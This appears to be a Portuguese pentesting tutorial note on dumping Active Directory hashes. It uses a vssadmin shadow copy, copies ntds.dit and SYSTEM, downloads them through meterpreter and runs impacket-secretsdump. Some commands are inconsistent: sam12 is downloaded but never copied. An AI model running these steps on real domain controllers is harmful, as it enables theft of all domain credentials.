<h1 align="center">Obetendo Hashes em sistemas Servidores com Active Directory</h1>
<hr>

```ad-question
title:Oque eh AD ?
Quando o Windows Server ele possui o AD ele centraliza varias contas de usuarios , grupos de usuarios entao pode criar varios departamentos dentro da empresa com varias contas e diversos tipos de permissoes e tudo isso eh centralizado no AD.Entao se voce usar as tecnicas mencionadas ate agora pra pegasr o SAM e o SYSTEM , voce vai obter o hash normalmente do Windows Server Local e nao das credenciais ou das contas de usuarios que estao no AD.

Pra voce conseguir obter isso e extrair essas informacoes do AD, voce precisa acessar o NTDS.DIT entao muda um pouco essa estrutura.Tambem vamos aprender uma outra tecnica que extrai essas informacoes sem ser pelos registros do windows, servindo tambem para sistemas modernos quando voce nao conseguir salvar pelo registro do windows voce pode utilizar essa tecnica que a gente vai aprender.
```


Quando a gente fala de Windows Server com AD instalado a gente vai ter um  diretorio diferente  em `C:\Windows\NTDS` dentro desse diretorio vai ter um arquivo chamado <span style='color:var(--mk-color-teal)'>ntds.dit</span> ele eh o responsavel por armazenar  as informacoes do <span style='color:var(--mk-color-teal)'>AD</span> incluindo os hashes dos usuarios.

O problema eh que se a gente tentar copiar , baixar ou qualquer outra coisa vai nos retornar um erro dizendo que o ja esta em processo , ou seja ele eh um arquivo protegido assim como o SAM normal eh protegido , nao conseguimos acessar ele assim diretamente.

Oque a gente pode usar uma outra tecnica tambem valida para sistemas modernos, oque a gente vai fazer eh utilizar o <span style='color:var(--mk-color-green)'>vssadmin</span> um utilitario que vem com o Windows para fazer uma copia sombra dos volumes que tem no windows , entao vamos fazer essa copia desse arquivo ntds.dit

meterpreter>```sh
C:\>vssadmin create shadow /for=c:
```

Quando fazemos isso , basicamente estamos clonando todo nossa raiz `C:` , mas agora quando acessarmos o diretorio, estaremos dentro da raiz da copia e nao do sistema em execucao (original) . Uma vez dentro , agora podemos copiar os arquivos .

```sh
C:\>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds-copy.dit

C:\>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\system32\config\system c:\system12  
```

Agora baixamos simplesmente com meterpreter

```sh
meterpreter>download sam12
meterpreter> download system12
meterpreter> download ntds-copy.dit
```

Utilizamos o impacket agora:

```sh
impacket-secretsdump -sam sam12 -system system12 LOCAL
```

Mas isso pegariamos somente as credenciais do administrador da conta local

Se quiser pegarmos as informacoes do AD , ao inves de usarmos o SAM , a gente utiliza o `ntds` e passa o arquivo `ntds-copy.dit`

```sh
impacket-secretsdump -ntds ntds-copy.dit -system system12 LOCAL
```